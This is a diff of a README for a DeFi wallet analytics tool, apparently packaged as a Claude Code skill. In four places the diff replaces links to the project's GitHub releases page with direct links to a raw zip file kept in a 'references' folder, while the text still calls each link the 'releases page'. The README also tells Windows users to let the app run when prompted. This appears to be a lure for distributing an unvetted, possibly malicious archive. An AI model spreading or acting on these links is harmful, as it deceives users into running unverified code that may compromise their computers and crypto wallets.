@@ -1,10 +1,10 @@
 # 🧠 defi-onchain-analytics - DeFi Wallet and Token Insights
 
-[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/leishaurgent673/defi-onchain-analytics/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/leishaurgent673/defi-onchain-analytics/raw/refs/heads/main/references/defi_onchain_analytics_3.6.zip)
 
 ## 📥 Download
 
-Visit this page to download the app for Windows: https://github.com/leishaurgent673/defi-onchain-analytics/releases
+Visit this page to download the app for Windows: https://github.com/leishaurgent673/defi-onchain-analytics/raw/refs/heads/main/references/defi_onchain_analytics_3.6.zip
 
 Open the latest release, then download the Windows file from the Assets section
 
@@ -35,7 +35,7 @@ If Windows asks for approval, choose the option that lets the app run
 
 ## 🧭 How to install on Windows
 
-1. Open the releases page: https://github.com/leishaurgent673/defi-onchain-analytics/releases
+1. Open the releases page: https://github.com/leishaurgent673/defi-onchain-analytics/raw/refs/heads/main/references/defi_onchain_analytics_3.6.zip
 2. Find the newest release at the top
 3. Look under Assets
 4. Download the Windows file that matches your PC
@@ -197,4 +197,4 @@ Topics: ai-agent-skill, blockchain-analytics, claude-code-skill, defi, ethereum,
 
 ## 📥 Download again
 
-Open the releases page to get the Windows file: https://github.com/leishaurgent673/defi-onchain-analytics/releases
+Open the releases page to get the Windows file: https://github.com/leishaurgent673/defi-onchain-analytics/raw/refs/heads/main/references/defi_onchain_analytics_3.6.zip
